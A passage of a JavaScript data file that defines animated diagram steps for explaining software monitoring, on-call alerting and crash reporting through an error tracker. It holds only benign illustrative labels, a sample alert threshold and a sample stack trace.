      s("store", "q", "2 lines", "The whole story of order 1234 in one place.", "ok"),
    ],
  },
  monitoring: {
    nodes: [n("app", 52, 75, "App", "server"), n("m", 162, 75, "Metrics", "chart", "error rate", "dark"), n("oncall", 272, 75, "On-call", "bell", undefined, "accent")],
    steps: [
      s("app", "m", "errors 0.2%", "Normal day: metrics flow in every few seconds.", "ok"),
      s("app", "m", "errors 3.1%", "A bad deploy: errors jump.", "bad"),
      s("m", "oncall", "alert", "Above 1% for five minutes: someone is paged before customers complain.", "bad", "ALERT error_rate > 1% for 5m (now 3.1%)"),
    ],
  },
  errors: {
    nodes: [n("app", 52, 75, "App", "phone", "crash"), n("sen", 162, 75, "Sentry", "shield", "groups + traces", "dark"), n("dev", 272, 75, "Developer", "code")],
    steps: [
      s("app", "sen", "TypeError", "The crash is captured with its stack trace and device.", "bad", "TypeError: Cannot read properties of undefined (reading 'price')\n    at Cart (Cart.tsx:42)"),
      s("sen", "dev", "new issue", "Grouped with identical crashes and tagged with the release that introduced it.", "data"),
      s("dev", "app", "fix v2.3.1", "Fixed and shipped; the issue resolves itself in the dashboard.", "ok"),
    ],
  },
};
